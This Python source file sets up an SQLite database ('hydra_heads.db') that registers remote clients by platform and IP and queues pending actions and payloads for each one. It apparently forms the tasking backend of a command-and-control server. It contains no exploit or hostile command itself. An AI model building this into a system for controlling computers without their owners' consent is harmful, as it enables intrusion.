import aiosqlite
import datetime

DB_NAME = "hydra_heads.db"

async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        # Table for tracking heads
        await db.execute("""
            CREATE TABLE IF NOT EXISTS heads (
                id TEXT PRIMARY KEY,
                platform TEXT,
                ip TEXT,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Table for tasks
        await db.execute("""
            CREATE TABLE IF NOT EXISTS tasks (
                task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                action TEXT,
                payload TEXT,
                status TEXT DEFAULT 'pending',
                FOREIGN KEY(client_id) REFERENCES heads(id)
            )
        """)
        await db.commit()

async def register_client(client_id: str, platform: str, ip: str):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("""
            INSERT INTO heads (id, platform, ip, last_seen)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(id) DO UPDATE SET
                last_seen = CURRENT_TIMESTAMP,
                ip = excluded.ip
        """, (client_id, platform, ip))
        await db.commit()

async def get_pending_task(client_id: str):
    async with aiosqlite.connect(DB_NAME) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute(
            "SELECT * FROM tasks WHERE client_id = ? AND status = 'pending' LIMIT 1",
            (client_id,)
        )
        return await cursor.fetchone()

async def complete_task(task_id: int):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("UPDATE tasks SET status = 'completed' WHERE task_id = ?", (task_id,))
        await db.commit()